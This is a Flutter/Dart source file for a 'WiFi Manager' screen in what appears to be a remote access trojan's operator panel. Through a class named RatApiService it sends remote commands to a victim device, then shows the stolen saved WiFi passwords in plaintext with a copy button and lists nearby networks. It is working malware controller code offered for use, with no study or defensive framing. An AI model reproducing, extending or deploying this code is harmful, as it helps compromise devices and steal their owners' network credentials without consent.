import 'dart:async';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'api_service.dart';
import 'constants.dart';

const _kBg   = Color(0xFF111827);
const _kCard = Color(0xFF1F2937);
const _kBlue = Color(0xFF3B82F6);
const _kCyan = Color(0xFF06B6D4);
const _kSub  = Color(0xFF9CA3AF);

class WifiManagerScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;
  const WifiManagerScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<WifiManagerScreen> createState() => _WifiManagerScreenState();
}

class _WifiManagerScreenState extends State<WifiManagerScreen> with SingleTickerProviderStateMixin {
  late RatApiService _api;
  late TabController _tab;
  List<dynamic> _saved = [], _nearby = [];
  bool _loadSaved = false, _loadNearby = false;
  String _status = '';

  @override
  void initState() {
    super.initState();
    _api = RatApiService(widget.sessionKey);
    _tab = TabController(length: 2, vsync: this);
    _fetchSaved();
  }

  @override
  void dispose() { _tab.dispose(); super.dispose(); }

  Future<void> _fetchSaved() async {
    setState(() => _loadSaved = true);
    try {
      final r = await _api.getSavedWifi(widget.deviceId);
      setState(() => _saved = r);
    } catch (e) { setState(() => _status = 'Error: $e'); }
    setState(() => _loadSaved = false);
  }

  Future<void> _triggerSavedScan() async {
    setState(() { _loadSaved = true; _status = 'Recovering passwords...'; });
    try {
      await _api.sendCommand(widget.deviceId, 'GET_SAVED_WIFI');
      await Future.delayed(const Duration(seconds: 4));
      final r = await _api.getSavedWifi(widget.deviceId);
      setState(() { _saved = r; _status = ''; });
    } catch (e) { setState(() => _status = 'Error: $e'); }
    setState(() => _loadSaved = false);
  }

  Future<void> _scanNearby() async {
    setState(() { _loadNearby = true; _status = 'Scanning...'; });
    try {
      await _api.sendCommand(widget.deviceId, 'GET_NEARBY_WIFI');
      await Future.delayed(const Duration(seconds: 6));
      final r = await _api.getNearbyWifi(widget.deviceId);
      setState(() { _nearby = r; _status = ''; });
    } catch (e) { setState(() => _status = 'Error: $e'); }
    setState(() => _loadNearby = false);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _kBg,
      appBar: AppBar(
        backgroundColor: _kCard,
        elevation: 0,
        leading: GestureDetector(
          onTap: () => Navigator.pop(context),
          child: Container(margin: const EdgeInsets.all(10), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(8), border: Border.all(color: Colors.white12)), child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white70, size: 16)),
        ),
        title: Row(children: [
          Container(padding: const EdgeInsets.all(7), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(9)), child: const Icon(Icons.wifi_rounded, color: Colors.white, size: 16)),
          const SizedBox(width: 10),
          const Text('WiFi Manager', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 16)),
        ]),
        iconTheme: const IconThemeData(color: Colors.white70),
        bottom: TabBar(
          controller: _tab,
          labelColor: _kBlue,
          unselectedLabelColor: _kSub,
          indicatorColor: _kBlue,
          indicatorWeight: 2,
          tabs: const [
            Tab(icon: Icon(Icons.lock_rounded, size: 18), text: 'Saved WiFi'),
            Tab(icon: Icon(Icons.wifi_find_rounded, size: 18), text: 'Nearby Scan'),
          ],
        ),
        actions: [
          IconButton(icon: const Icon(Icons.refresh_rounded, color: _kSub), onPressed: _fetchSaved),
        ],
      ),
      body: TabBarView(controller: _tab, children: [_savedList(), _nearbyList()]),
    );
  }

  Widget _savedList() {
    if (_loadSaved) return const Center(child: CircularProgressIndicator(color: _kBlue, strokeWidth: 2));
    
    return Column(children: [
      Padding(
        padding: const EdgeInsets.all(14),
        child: GestureDetector(
          onTap: _loadSaved ? null : _triggerSavedScan,
          child: Container(
            width: double.infinity,
            padding: const EdgeInsets.symmetric(vertical: 14),
            decoration: BoxDecoration(gradient: _loadSaved ? null : const LinearGradient(colors: [_kBlue, _kCyan]), color: _loadSaved ? Colors.grey.shade800 : null, borderRadius: BorderRadius.circular(12)),
            child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
              _loadSaved 
                ? const SizedBox(width: 16, height: 16, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                : const Icon(Icons.vpn_key_rounded, color: Colors.white, size: 18),
              const SizedBox(width: 8),
              Text(_loadSaved ? 'Recovering...' : 'Recover Saved WiFi Passwords', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 14)),
            ]),
          ),
        ),
      ),
      if (_status.isNotEmpty && _tab.index == 0) Padding(padding: const EdgeInsets.symmetric(horizontal: 14), child: Text(_status, style: const TextStyle(color: _kSub, fontSize: 12))),
      Expanded(
        child: _saved.isEmpty 
          ? _empty('No saved WiFi data found.\nTap button above to recover.', Icons.wifi_off_rounded)
          : ListView.builder(
              padding: const EdgeInsets.all(14),
              physics: const BouncingScrollPhysics(),
              itemCount: _saved.length,
              itemBuilder: (_, i) {
                final n = _saved[i];
                final ssid = n['ssid']?.toString() ?? n['SSID']?.toString() ?? 'Unknown';
                final pass = n['password']?.toString() ?? n['psk']?.toString() ?? '(encrypted)';
                return Container(
                  margin: const EdgeInsets.only(bottom: 10),
                  decoration: BoxDecoration(gradient: LinearGradient(colors: [_kCard.withOpacity(0.95), _kBg.withOpacity(0.95)]), borderRadius: BorderRadius.circular(12), border: Border.all(color: _kBlue.withOpacity(0.2))),
                  child: ListTile(
                    leading: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(10)), child: const Icon(Icons.wifi_rounded, color: Colors.white, size: 18)),
                    title: Text(ssid, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600, fontSize: 14)),
                    subtitle: Text(pass, style: const TextStyle(color: _kSub, fontSize: 12)),
                    trailing: GestureDetector(
                      onTap: () {
                        Clipboard.setData(ClipboardData(text: pass));
                        ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('Password copied'), duration: Duration(seconds: 2), behavior: SnackBarBehavior.floating));
                      },
                      child: Container(padding: const EdgeInsets.all(7), decoration: BoxDecoration(color: _kBlue.withOpacity(0.1), borderRadius: BorderRadius.circular(8), border: Border.all(color: _kBlue.withOpacity(0.2))), child: const Icon(Icons.copy_rounded, color: _kBlue, size: 16)),
                    ),
                  ),
                );
              },
            ),
      ),
    ]);
  }

  Widget _nearbyList() {
    return Column(children: [
      Padding(
        padding: const EdgeInsets.all(14),
        child: GestureDetector(
          onTap: _loadNearby ? null : _scanNearby,
          child: Container(
            width: double.infinity,
            padding: const EdgeInsets.symmetric(vertical: 14),
            decoration: BoxDecoration(gradient: _loadNearby ? null : const LinearGradient(colors: [_kBlue, _kCyan]), color: _loadNearby ? Colors.grey.shade800 : null, borderRadius: BorderRadius.circular(12)),
            child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
              _loadNearby
                ? const SizedBox(width: 16, height: 16, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                : const Icon(Icons.radar_rounded, color: Colors.white, size: 18),
              const SizedBox(width: 8),
              Text(_loadNearby ? 'Scanning...' : 'Scan Nearby WiFi', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 14)),
            ]),
          ),
        ),
      ),
      if (_status.isNotEmpty) Padding(padding: const EdgeInsets.symmetric(horizontal: 14), child: Text(_status, style: const TextStyle(color: _kSub, fontSize: 12))),
      Expanded(
        child: _nearby.isEmpty
          ? _empty('Tap scan to find nearby networks', Icons.wifi_find_rounded)
          : ListView.builder(
              padding: const EdgeInsets.symmetric(horizontal: 14),
              physics: const BouncingScrollPhysics(),
              itemCount: _nearby.length,
              itemBuilder: (_, i) {
                final n = _nearby[i];
                final rssi = int.tryParse(n['level']?.toString() ?? n['rssi']?.toString() ?? '-100') ?? -100;
                final bars = rssi > -60 ? 4 : rssi > -70 ? 3 : rssi > -80 ? 2 : 1;
                return Container(
                  margin: const EdgeInsets.only(bottom: 8),
                  decoration: BoxDecoration(gradient: LinearGradient(colors: [_kCard.withOpacity(0.95), _kBg.withOpacity(0.95)]), borderRadius: BorderRadius.circular(12), border: Border.all(color: _kBlue.withOpacity(0.15))),
                  child: ListTile(
                    leading: Icon(_signalIcon(bars), color: bars >= 3 ? const Color(0xFF10B981) : bars == 2 ? const Color(0xFFF59E0B) : const Color(0xFFEF4444), size: 24),
                    title: Text(n['SSID']?.toString() ?? n['ssid']?.toString() ?? 'Hidden', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600, fontSize: 13)),
                    subtitle: Text('${n['capabilities'] ?? n['security'] ?? 'Open'} · ${rssi}dBm', style: const TextStyle(color: _kSub, fontSize: 11)),
                    trailing: Text('${n['frequency'] ?? ''}MHz', style: const TextStyle(color: _kSub, fontSize: 10)),
                  ),
                );
              },
            ),
      ),
    ]);
  }

  IconData _signalIcon(int bars) => bars >= 4 ? Icons.signal_wifi_4_bar : bars == 3 ? Icons.network_wifi_3_bar : bars == 2 ? Icons.network_wifi_2_bar : Icons.network_wifi_1_bar;

  Widget _empty(String msg, IconData icon) => Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
    Container(padding: const EdgeInsets.all(20), decoration: BoxDecoration(color: _kCard.withOpacity(0.5), borderRadius: BorderRadius.circular(16), border: Border.all(color: _kBlue.withOpacity(0.15))), child: Icon(icon, size: 48, color: _kBlue.withOpacity(0.3))),
    const SizedBox(height: 14),
    Text(msg, textAlign: TextAlign.center, style: const TextStyle(color: _kSub, fontSize: 13)),
  ]));
}
